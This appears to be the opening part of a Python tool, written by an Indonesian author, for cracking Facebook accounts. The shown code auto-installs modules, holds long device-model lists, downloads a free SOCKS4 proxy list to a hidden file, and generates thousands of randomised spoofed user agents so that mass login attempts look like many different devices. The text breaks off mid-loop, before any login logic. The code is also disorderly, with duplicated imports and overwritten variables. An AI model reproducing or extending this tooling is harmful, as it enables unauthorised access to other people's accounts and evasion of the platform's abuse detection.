#!/usr/bin/python3
#-*-coding:utf-8-*-
import os
try:
	import requests
except ImportError:
	print('\n [×] requests module not installed!...\n')
	os.system('pip install requests')
try:
	import concurrent.futures
except ImportError:
	print('\n [×] Futures module not installed!...\n')
	os.system('pip install futures')
try:
	import bs4
except ImportError:
	print('\n [×] Bs4 module not installed!...\n')
	os.system('pip install bs4')

import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from concurrent.futures import ThreadPoolExecutor 
import os,sys,time,json,random,re,string,platform,base64
from requests.exceptions import ConnectionError
import string
import os, sys, time, json, random, platform, requests, rich, re
from concurrent.futures import ThreadPoolExecutor as khamdihiXV
from datetime import datetime
from os import system as sis
from time import time as tim

from rich.panel import Panel
from rich.console import Console

bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"]
month = datetime.now().month - 1
reall = bulan[month]

days = datetime.now().day
year = datetime.now().year
indo = "%s-%s-%s"%(days,reall,year)
ok,cp,loop,= [],[],0

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
ua_ig = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 480dpi; 1920x1080; Xiaomi/xiaomi; Redmi Note 4; mido; qcom; ru_RU; 98288242)"
komen = random.choice(["programmers bang?","Bakso kontoll","Panutan ku!","keren suhu♥"])

try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
from datetime import datetime
from bs4 import BeautifulSoup
def runtxt(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
plist = (platform.uname())[2]
basex = plist
basex1 = basex.encode('ascii')
basex2 = base64.b64encode(basex1)
basex3 = basex2.decode('ascii')
base4 = (basex3).upper()
basesplit = base4.replace('=', 'X').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E',                                                                                                                '4').replace(
    'M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', '8')
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'
lr="\033[0;91m"
lg="\033[0;92m"
ly="\033[0;93m"
lb="\033[0;94m"
lp="\033[0;95m"
lc="\033[0;96m"
ll="\033[0;97m"
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '{RED}'
H = '{GREEN}'
N = '\x1b[1;37m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
r="\033[1;91m"
g="\033[1;92m"
y="\033[1;93m"
b="\033[1;94m"
p="\033[1;95m"
c="\033[1;96m"
l="\033[1;97m"
yy = '\033[1;97m'
s="\033[0m"
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
GREEN ='\x1b[38;5;46m'
RED = '\x1b[38;5;196m'
WHITE = '\033[1;97m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
R = '{RED}' # PUTIH
G = '{GREEN}' # PUTIH
Y = '\033[1;33m' # PUTIH
Q = '\033[1;37m'
T = '\033[1;34m'
HBF = '{ HBF }'
ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
oks = []
cps = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass
fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")


ugen=[]
ugen=[]
useragent=[]


try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	exit(e)
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; U; Android 11;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='fr-fr; Redmi Note 11 Build/'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
#Mozilla/5.0 (Linux; U; Android 11; fr-fr; Redmi Note 11 Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn
#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36
	aa='Mozilla/5.0 (Linux; Android 13;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 10 Pro'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	
	aa='Mozilla/5.0 (Linux; Android 10;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 10 Pro'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 10 Pro'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	
	aa='Mozilla/5.0 (Linux; Android 11;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 10 Pro'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 9;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 10 Pro'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	#Mozilla/5.0 (Linux; Android 10; Redmi Note 7S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36
	aa='Mozilla/5.0 (Linux; Android 10;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 7S'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/83.0.4103.101 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	
	
	aa='Mozilla/5.0 (Linux; Android 7.0;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 4 Build/NRD90M)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	
	
	aa='Mozilla/5.0 (Linux; Android 13;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Vivo Y91C)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	#Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76
	aa='Mozilla/5.0 (Linux; Android 13;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 10 Pro'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	
	aa='Mozilla/5.0 (Windows NT 10.0; Win64;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Windows NT 10.0; Win64'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	
	aa='Mozilla/5.0 (X11; CrOS x86_64 15183.78.0;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['X11; CrOS x86_64 15183.78.0'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/108.0.5359.172 Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (X11; CrOS armv7l 15183.78.0;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['X11; CrOS armv7l 15183.78.0'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/108.0.5359.172 Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	
	aa='Mozilla/5.0 (X11; CrOS aarch64 15183.78.0;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
